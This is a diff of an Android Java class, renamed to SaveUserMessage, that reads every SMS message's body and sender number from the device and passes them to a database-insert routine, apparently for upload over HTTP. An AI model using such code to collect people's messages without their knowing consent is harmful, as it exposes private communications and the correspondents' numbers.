@@ -8,11 +8,8 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.support.v4.content.ContextCompat;
-import android.view.View;
-import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
-import android.widget.Toast;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -28,24 +25,24 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
-public class Check extends Application{
+public class SaveUserMessage extends Application{
 
     // private static MainActivity inst;
     ArrayList<String> smsMessagesList = new ArrayList<String>();
     ListView smsListView;
     ArrayAdapter arrayAdapter;
     //private
+    protected static Context context;
 
-    public static Context contextOfApplication;
-
-    public static Context getContextOfApplication() {
-        return contextOfApplication;
+    ///////////////////le context de l'application///////////////////
+    protected SaveUserMessage(Context context) {
+        this.context = context;
     }
 
-    public void SaveUserMessage() {
-        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+    protected static void SaveUserMessage() {
+        if (ContextCompat.checkSelfPermission(context, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
 
-            ContentResolver contentResolver = getContentResolver();
+            ContentResolver contentResolver = context.getContentResolver();
             Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
             int indexBody = smsInboxCursor.getColumnIndex("body");
             int indexAddress = smsInboxCursor.getColumnIndex("address");
@@ -61,18 +58,13 @@ public class Check extends Application{
                         "nouvelle date", "actif");
 
             } while (smsInboxCursor.moveToNext());
-            arrayAdapter.clear();
+            smsInboxCursor.close();
             //InsertData("papa","pa@mail.com");
         }
     }
 
-    public void updateList(final String smsMessage) {
-        arrayAdapter.insert(smsMessage, 0);
-        arrayAdapter.notifyDataSetChanged();
-    }
 
-
-    public static void InsertData(final int id_user, final int id_message, final String contenu_message, final String type_messag,
+    protected static void InsertData(final int id_user, final int id_message, final String contenu_message, final String type_messag,
                                    final String dat_message, final String heure_message,final String correspondant_number,
                                    final String correspondant_name,final String dat_ins_message,final String heure_ins_message,
                                    final String etat) {
